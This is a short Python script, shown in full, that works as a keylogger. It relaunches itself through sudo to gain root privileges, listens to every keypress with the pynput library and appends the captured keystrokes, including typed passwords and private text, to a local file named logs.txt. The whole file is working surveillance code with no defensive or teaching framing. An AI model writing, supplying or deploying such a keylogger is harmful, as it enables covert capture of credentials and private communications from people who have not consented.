from datetime import datetime
import os
import sys
from pynput.keyboard import Listener

# Re-execute script with sudo privileges if not running as root
if os.name == "posix" and os.geteuid() != 0:
    os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

def log_pressedkey(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key in ['Key.shift', 'Key.shift_r', 'Key.backspace']:
        key = ''

    with open("logs.txt", "a") as f:
        f.write(key)

with Listener(on_press=log_pressedkey) as l:
    l.join()